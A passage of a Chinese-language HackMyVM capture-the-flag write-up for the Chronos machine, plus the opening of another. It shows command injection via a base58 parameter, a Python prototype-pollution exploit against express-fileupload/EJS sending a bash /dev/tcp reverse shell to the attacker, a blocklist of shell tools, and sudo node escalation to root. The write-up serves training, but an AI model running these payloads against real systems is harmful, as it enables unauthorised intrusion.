MAC Address: 08:00:27:7A:75:94 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.12</span> seconds</code></pre>
<p>开放了 22 80 8000三个端口<br>先去80端口看一下</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/06/21/OPkkUg.png" alt="OPkkUg.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/21/OPkxyB.png" alt="OPkxyB.png" loading="lazy"><br>有代码，应该加了混淆，让gpt帮我整理了一下</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> elements <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token string">'150447srWefj'</span><span class="token punctuation">,</span> <span class="token string">'70lwLrol'</span><span class="token punctuation">,</span> <span class="token string">'1658165LmcNig'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'1260881JUqdKM'</span><span class="token punctuation">,</span> 
  <span class="token string">'10737CrnEEe'</span><span class="token punctuation">,</span> <span class="token string">'2SjTdWC'</span><span class="token punctuation">,</span> <span class="token string">'readyState'</span><span class="token punctuation">,</span> <span class="token string">'responseText'</span><span class="token punctuation">,</span> <span class="token string">'1278676qXleJg'</span><span class="token punctuation">,</span> 
  <span class="token string">'797116soVTES'</span><span class="token punctuation">,</span> <span class="token string">'onreadystatechange'</span><span class="token punctuation">,</span> 
  <span class="token string">'http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL'</span><span class="token punctuation">,</span> 
  <span class="token string">'User-Agent'</span><span class="token punctuation">,</span> <span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token string">'1DYOODT'</span><span class="token punctuation">,</span> <span class="token string">'400909Mbbcfr'</span><span class="token punctuation">,</span> <span class="token string">'Chronos'</span><span class="token punctuation">,</span> <span class="token string">'2QRBPWS'</span><span class="token punctuation">,</span> 
  <span class="token string">'getElementById'</span><span class="token punctuation">,</span> <span class="token string">'innerHTML'</span><span class="token punctuation">,</span> <span class="token string">'date'</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">array<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> offset</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">0x7e</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> array<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> 
                   <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x8e</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 
                   <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x83</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> 
                   <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x82</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x8d</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> 
                   <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 
                   <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span> array<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>array<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      array<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>array<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>elements<span class="token punctuation">,</span> <span class="token number">0xcaf1e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> offset</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">0x7e</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> elements<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">loadDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> userAgent <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x8f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">0x4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">0xc8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">0x8a</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span> userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>根据解密逻辑，User-Agent需要是<code>Chronos</code>并且访问<a href="http://192.168.56.185:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL">http://192.168.56.185:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</a><br><img src="https://ooo.0x0.ooo/2024/06/21/OPkzds.png" alt="OPkzds.png" loading="lazy"><br>好像是一个打印日期的脚本,我输错一个参数是base58编码<br><img src="https://ooo.0x0.ooo/2024/06/21/OPkiea.png" alt="OPkiea.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/21/OPknES.png" alt="OPknES.png" loading="lazy"><br>感觉可以注入<br><img src="https://ooo.0x0.ooo/2024/06/21/OPk1IN.png" alt="OPk1IN.png" loading="lazy"><br>试了好几个发现perl的可以反弹shell<br><img src="https://ooo.0x0.ooo/2024/06/21/OPkNFC.png" alt="OPkNFC.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/21/OPkeRL.png" alt="OPkeRL.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.185<span class="token punctuation">]</span> <span class="token number">33458</span>
/bin/sh: <span class="token number">0</span>: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
$     </code></pre>
<p>也是顺利拿到shell</p>
<h2 id="提取user"><a href="#提取user" class="headerlink" title="提取user"></a>提取user</h2><p>先看家目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@chronos:/opt/chronos$ <span class="token builtin class-name">cd</span> /home
www-data@chronos:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root  root  <span class="token number">4096</span> Jul <span class="token number">29</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">23</span> root  root  <span class="token number">4096</span> Jul <span class="token number">29</span>  <span class="token number">2021</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">6</span> imera imera <span class="token number">4096</span> Aug  <span class="token number">4</span>  <span class="token number">2021</span> imera</code></pre>
<p>只有一个用户imera，看不了user flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@chronos:/opt/chronos$ <span class="token function">cat</span> app.js 

// created by alienum <span class="token keyword">for</span> Penetration Testing
const express <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
const <span class="token punctuation">&#123;</span> <span class="token builtin class-name">exec</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
const bs58 <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'bs58'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
const app <span class="token operator">=</span> express<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

const port <span class="token operator">=</span> <span class="token number">8000</span><span class="token punctuation">;</span>

const cors <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'cors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app.use<span class="token punctuation">(</span>cors<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>

app.get<span class="token punctuation">(</span><span class="token string">'/'</span>, <span class="token punctuation">(</span>req,res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
  
    res.sendFile<span class="token punctuation">(</span><span class="token string">"/var/www/html/index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app.get<span class="token punctuation">(</span><span class="token string">'/date'</span>, <span class="token punctuation">(</span>req, res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>

    var agent <span class="token operator">=</span> req.headers<span class="token punctuation">[</span><span class="token string">'user-agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    var cmd <span class="token operator">=</span> <span class="token string">'date '</span><span class="token punctuation">;</span>
    const <span class="token function">format</span> <span class="token operator">=</span> req.query.format<span class="token punctuation">;</span>
    const bytes <span class="token operator">=</span> bs58.decode<span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
    var decoded <span class="token operator">=</span> bytes.toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    var concat <span class="token operator">=</span> cmd.concat<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>agent <span class="token operator">==</span><span class="token operator">=</span> <span class="token string">'Chronos'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>concat.includes<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span> <span class="token operator">||</span> concat.includes<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span> <span class="token operator">||</span> concat.includes<span class="token punctuation">(</span><span class="token string">'python'</span><span class="token punctuation">)</span> <span class="token operator">||</span> concat.includes<span class="token punctuation">(</span><span class="token string">'nc'</span><span class="token punctuation">)</span> <span class="token operator">||</span> concat.includes<span class="token punctuation">(</span><span class="token string">'bash'</span><span class="token punctuation">)</span> <span class="token operator">||</span> concat.includes<span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">)</span> <span class="token operator">||</span> concat.includes<span class="token punctuation">(</span><span class="token string">'which'</span><span class="token punctuation">)</span> <span class="token operator">||</span> concat.includes<span class="token punctuation">(</span><span class="token string">'socat'</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>

            res.send<span class="token punctuation">(</span><span class="token string">"Something went wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        exec<span class="token punctuation">(</span>concat, <span class="token punctuation">(</span>error, stdout, stderr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                console.log<span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>error: $<span class="token punctuation">&#123;</span>error.message<span class="token punctuation">&#125;</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token builtin class-name">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>stderr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                console.log<span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>stderr: $<span class="token punctuation">&#123;</span>stderr<span class="token punctuation">&#125;</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token builtin class-name">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            res.send<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    else<span class="token punctuation">&#123;</span>

        res.send<span class="token punctuation">(</span><span class="token string">"Permission Denied"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app.listen<span class="token punctuation">(</span>port,<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>

    console.log<span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>Server running at $<span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>
<p>原来python nc 啥的都被ban了<br>在看端口的时候发现一个新的端口8080</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@chronos:~$ ss <span class="token parameter variable">-tulnp</span>
Netid State   Recv-Q  Send-Q            Local Address:Port   Peer Address:Port                                                                                  
udp   UNCONN  <span class="token number">0</span>       <span class="token number">0</span>                 <span class="token number">127.0</span>.0.53%lo:53          <span class="token number">0.0</span>.0.0:*                                                                                     
udp   UNCONN  <span class="token number">0</span>       <span class="token number">0</span>         <span class="token number">192.168</span>.56.185%enp0s3:68          <span class="token number">0.0</span>.0.0:*                                                                                     
tcp   LISTEN  <span class="token number">0</span>       <span class="token number">128</span>                     <span class="token number">0.0</span>.0.0:22          <span class="token number">0.0</span>.0.0:*                                                                                     
tcp   LISTEN  <span class="token number">0</span>       <span class="token number">128</span>                   <span class="token number">127.0</span>.0.1:8080        <span class="token number">0.0</span>.0.0:*                                                                                     
tcp   LISTEN  <span class="token number">0</span>       <span class="token number">128</span>               <span class="token number">127.0</span>.0.53%lo:53          <span class="token number">0.0</span>.0.0:*                                                                                     
tcp   LISTEN  <span class="token number">0</span>       <span class="token number">128</span>                        <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22             <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                                                                                     
tcp   LISTEN  <span class="token number">0</span>       <span class="token number">128</span>                           *:8000              *:*      users:<span class="token variable"><span class="token punctuation">((</span>"node"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">890</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">))</span></span>                                                 
tcp   LISTEN  <span class="token number">0</span>       <span class="token number">128</span>                           *:80                *:*  </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@chronos:~$ <span class="token function">curl</span> <span class="token number">127.0</span>.0.1:8080
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
<span class="token operator">&lt;</span>html<span class="token operator">></span>
    <span class="token operator">&lt;</span>head<span class="token operator">></span>
        <span class="token operator">&lt;</span>title<span class="token operator">></span>Chronos - Version <span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span>/title<span class="token operator">></span>
    <span class="token operator">&lt;</span>/head<span class="token operator">></span>
    <span class="token operator">&lt;</span>body<span class="token operator">></span>
        <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span>Coming Soon<span class="token punctuation">..</span>.<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span>
    <span class="token operator">&lt;</span>/body<span class="token operator">></span>
<span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre>
<p>是一个 Chronos version2的服务<br>刚才注意到这个服务在opt目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@chronos:/opt/chronos-v2/backend$ <span class="token function">cat</span> server.js 
const express <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
const fileupload <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">"express-fileupload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
const http <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>

const app <span class="token operator">=</span> express<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app.use<span class="token punctuation">(</span>fileupload<span class="token punctuation">(</span><span class="token punctuation">&#123;</span> parseNested: <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">))</span><span class="token punctuation">;</span>

app.set<span class="token punctuation">(</span><span class="token string">'view engine'</span>, <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app.set<span class="token punctuation">(</span><span class="token string">'views'</span>, <span class="token string">"/opt/chronos-v2/frontend/pages"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app.get<span class="token punctuation">(</span><span class="token string">'/'</span>, <span class="token punctuation">(</span>req, res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
   res.render<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

const server <span class="token operator">=</span> http.Server<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span>
const addr <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
const port <span class="token operator">=</span> <span class="token number">8080</span><span class="token punctuation">;</span>
server.listen<span class="token punctuation">(</span>port, addr, <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
   console.log<span class="token punctuation">(</span><span class="token string">'Server listening on '</span> + addr + <span class="token string">' port '</span> + port<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>ejs库使用<code>express-fileupload</code>来处理文件上传，并且<code>porcessNested</code>设置为True,可以通过文件名进行原型链污染<br>原理参考<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a><br><a href="https://blog.csdn.net/gental_z/article/details/107937110">https://blog.csdn.net/gental_z/article/details/107937110</a><br>做个端口转发方便打,把8080转发到6677端口可以访问</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">socat TCP4-LISTEN:6677,fork TCP4:127.0.0.1:8080</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> requests 
cmd <span class="token operator">=</span> <span class="token string">'bash -c "bash -i &amp;> /dev/tcp/192.168.56.104/4567 0>&amp;1"'</span> 
requests.post<span class="token punctuation">(</span><span class="token string">'http://192.168.56.185:6677'</span>, files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__proto__.outputFunctionName'</span>:<span class="token punctuation">(</span>None,f<span class="token string">"a;global.process.mainModule.require('child_process').exec('&#123;cmd&#125;');a"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> 
requests.get<span class="token punctuation">(</span><span class="token string">'http://192.168.56.185:6677'</span><span class="token punctuation">)</span> </code></pre>
<p>这个None表示文件位置，但是我们的直接写恶意payload，文件位置所以是None</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.185<span class="token punctuation">]</span> <span class="token number">33604</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">790</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
imera@chronos:/opt/chronos-v2/backend$</code></pre>
<p>拿到user shell</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>一手sudo哥们心里乐开花</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">imera@chronos:/opt/chronos-v2/backend$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> imera on chronos:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User imera may run the following commands on chronos:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/npm *
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/node *</code></pre>
<p>怕哥们不会还给两个，直接用<code>npm</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">imera@chronos:~$ <span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp <span class="token parameter variable">-d</span><span class="token variable">)</span></span>
<span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp <span class="token parameter variable">-d</span><span class="token variable">)</span></span>
imera@chronos:~$ <span class="token builtin class-name">echo</span> <span class="token string">'&#123;"scripts": &#123;"preinstall": "/bin/sh"&#125;&#125;'</span> <span class="token operator">></span> <span class="token variable">$TF</span>/package.json
<span class="token operator">&lt;</span>ts<span class="token string">": &#123;"</span>preinstall<span class="token string">": "</span>/bin/sh"<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>' <span class="token operator">></span> <span class="token variable">$TF</span>/package.json
imera@chronos:~$ <span class="token function">sudo</span> /usr/local/bin/npm  <span class="token parameter variable">-C</span> <span class="token variable">$TF</span> --unsafe-perm i
<span class="token function">sudo</span> /usr/local/bin/npm  <span class="token parameter variable">-C</span> <span class="token variable">$TF</span> --unsafe-perm i
<span class="token operator">></span> preinstall
<span class="token operator">></span> /bin/sh
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>imera<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>imera<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>imera<span class="token punctuation">)</span></code></pre>
<p>好家伙失败，换一个，用<code>node</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">node</span> <span class="token parameter variable">-e</span> <span class="token string">'require("child_process").spawn("/bin/sh", &#123;stdio: [0, 1, 2]&#125;)'</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>



]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>nodejs</tag>
        <tag>express-fileupload</tag>
        <tag>node提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-colors</title>
    <url>/posts/50cc8bce/</url>
    <content><![CDATA[<p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.183</strong></p>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; arp-scan -l                 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104
Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;royhills&#x2F;arp-scan)
192.168.56.1    0a:00:27:00:00:05       (Unknown: locally administered)
